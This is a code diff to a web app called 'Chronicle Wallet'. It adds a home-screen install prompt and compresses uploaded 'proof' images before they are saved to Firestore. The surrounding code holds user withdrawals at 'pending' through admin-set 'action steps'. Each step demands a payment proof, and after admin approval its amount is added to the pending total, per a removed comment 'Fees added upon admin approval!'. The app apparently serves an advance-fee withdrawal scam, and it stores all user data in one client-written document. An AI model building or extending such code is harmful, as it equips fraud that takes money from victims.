@@ -137,6 +137,23 @@
         </div>
     </div>
 
+    <!-- INSTALL APP WELCOME MODAL -->
+    <div class="modal" id="install-app-modal">
+        <div class="modal-body" style="text-align:center;">
+            <span class="close-btn" onclick="closeInstallModal()">&times;</span>
+            <div style="font-size:3rem; margin-bottom:0.5rem;">📱</div>
+            <h3 style="margin-bottom:0.75rem; color:var(--primary);">Install Chronicle Wallet App</h3>
+            <p style="color:var(--text-muted); font-size:0.875rem; margin-bottom:1.25rem; line-height:1.5;">
+                For the best experience, fastest loading speeds, and instant notifications, add Chronicle Wallet directly to your home screen!
+            </p>
+            <div style="background:var(--bg-input); padding:1rem; border-radius:10px; text-align:left; font-size:0.85rem; margin-bottom:1.25rem;">
+                <div style="margin-bottom:0.75rem;">🤖 <strong>Android (Chrome):</strong> Tap the 3 dots (⋮) in the top right corner and select <strong>"Install app"</strong> or <strong>"Add to Home screen"</strong>.</div>
+                <div>🍎 <strong>iPhone (Safari):</strong> Tap the Share button (square with arrow ↗) at the bottom and select <strong>"Add to Home Screen"</strong>.</div>
+            </div>
+            <button class="btn btn-success" onclick="closeInstallModal()">Got it, Let's Go!</button>
+        </div>
+    </div>
+
     <!-- SUPPORT CHAT DRAWER -->
     <div id="support-drawer">
         <div class="chat-header">
@@ -1125,7 +1142,6 @@
             u.stepIdx = 0;
             const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", amount: 0, statusMsg: "Processing" };
 
-            // Initial transaction shows base withdrawal amount ONLY. Fees added upon admin approval!
             u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, baseWithdraw: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
             saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
@@ -1162,7 +1178,7 @@
         }
         function closeActionModal() { document.getElementById('action-modal').style.display = 'none'; }
 
-        // --- SUBMIT PROOF WITH ROBUST FIRESTORE SYNC ---
+        // --- COMPRESSED & OPTIMIZED PROOF SUBMISSION (AVOIDS FIRESTORE 1MB LIMIT) ---
         function submitProof() {
             const fileInput = document.getElementById('proof-file');
             if (!fileInput.files || !fileInput.files[0]) { 
@@ -1170,44 +1186,70 @@
                 return; 
             }
             
+            const file = fileInput.files[0];
             const reader = new FileReader();
             reader.onload = function(evt) {
-                const u = getCurrentUserData();
-                if (!u) { alert("User session not found."); return; }
-                const currentStepIdx = u.stepIdx || 0;
-                const step = actionSteps[currentStepIdx];
-                if (!step) { alert("No active step found."); return; }
+                const img = new Image();
+                img.onload = function() {
+                    // Compress image canvas resolution to fit safely under database limit
+                    const canvas = document.createElement('canvas');
+                    const MAX_WIDTH = 600;
+                    const MAX_HEIGHT = 600;
+                    let width = img.width;
+                    let height = img.height;
 
-                proofQueue.push({ 
-                    id: Date.now(), 
-                    user: currentUserEmail, 
-                    stepIdx: currentStepIdx,
-                    stepTitle: step.title, 
-                    amount: step.amount, 
-                    image: evt.target.result, 
-                    statusMsg: step.statusMsg || "Processing", 
-                    timerMinutes: step.timerMinutes || 2 
-                });
-                
-                const tx = u.txs.find(t => t.id == u.activeTxId);
-                if (tx) tx.status = `PROOF SUBMITTED (PENDING ADMIN REVIEW)`;
+                    if (width > height) {
+                        if (width > MAX_WIDTH) { height *= MAX_WIDTH / width; width = MAX_WIDTH; }
+                    } else {
+                        if (height > MAX_HEIGHT) { width *= MAX_HEIGHT / height; height = MAX_HEIGHT; }
+                    }
 
-                db.collection("config").doc("appData").set({
-                    usersList: usersList,
-                    proofQueue: proofQueue
-                }, { merge: true }).then(() => {
-                    closeActionModal();
-                    fileInput.value = "";
-                    showNotification("Submitted", `Proof submitted! Waiting for Admin approval.`, "🖼️");
-                    alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
-                }).catch(err => {
-                    alert("Error saving proof to database. Please try again.");
-                });
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, width, height);
+                    
+                    const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.6);
+
+                    const u = getCurrentUserData();
+                    if (!u) { alert("User session not found."); return; }
+                    const currentStepIdx = u.stepIdx || 0;
+                    const step = actionSteps[currentStepIdx];
+                    if (!step) { alert("No active step found."); return; }
+
+                    proofQueue.push({ 
+                        id: Date.now(), 
+                        user: currentUserEmail, 
+                        stepIdx: currentStepIdx,
+                        stepTitle: step.title, 
+                        amount: step.amount, 
+                        image: compressedDataUrl, 
+                        statusMsg: step.statusMsg || "Processing", 
+                        timerMinutes: step.timerMinutes || 2 
+                    });
+                    
+                    const tx = u.txs.find(t => t.id == u.activeTxId);
+                    if (tx) tx.status = `PROOF SUBMITTED (PENDING ADMIN REVIEW)`;
+
+                    db.collection("config").doc("appData").set({
+                        usersList: usersList,
+                        proofQueue: proofQueue,
+                        chatThreads: chatThreads
+                    }, { merge: true }).then(() => {
+                        closeActionModal();
+                        fileInput.value = "";
+                        showNotification("Submitted", `Proof submitted successfully!`, "🖼️");
+                        alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
+                    }).catch(err => {
+                        alert("Error saving proof to database: " + err.message);
+                    });
+                };
+                img.src = evt.target.result;
             };
             reader.onerror = function() {
-                alert("Failed to read image file. Please try another image.");
+                alert("Failed to read image file.");
             };
-            reader.readAsDataURL(fileInput.files[0]);
+            reader.readAsDataURL(file);
         }
 
         function openAdminLoginModal() { document.getElementById('admin-login-modal').style.display = 'flex'; }
@@ -1468,7 +1510,6 @@
         }
         function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
-        // --- ADMIN APPROVE PROOF: ADDS FEE AMOUNT TO PENDING TOTAL UPON APPROVAL ---
         function approveProof(proofId) {
             const pIndex = proofQueue.findIndex(x => x.id == proofId);
             if (pIndex === -1) return;
@@ -1480,7 +1521,6 @@
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
                 if (tx && step) {
-                    // Add the approved fee amount to the pending transaction amount now!
                     tx.amount += step.amount;
 
                     u.stepIdx = (u.stepIdx || 0) + 1;
@@ -1724,6 +1764,18 @@
             document.getElementById('buy-modal').style.display = 'flex';
         }
         function closeBuyModal() { document.getElementById('buy-modal').style.display = 'none'; }
+
+        function closeInstallModal() {
+            document.getElementById('install-app-modal').style.display = 'none';
+        }
+
+        // Show app install instructions modal on fresh visit
+        if (!localStorage.getItem('chronicle_install_prompt_shown')) {
+            setTimeout(() => {
+                document.getElementById('install-app-modal').style.display = 'flex';
+                localStorage.setItem('chronicle_install_prompt_shown', 'true');
+            }, 1000);
+        }
 
         updateBalanceUI();
         updateSupportAgentUI();
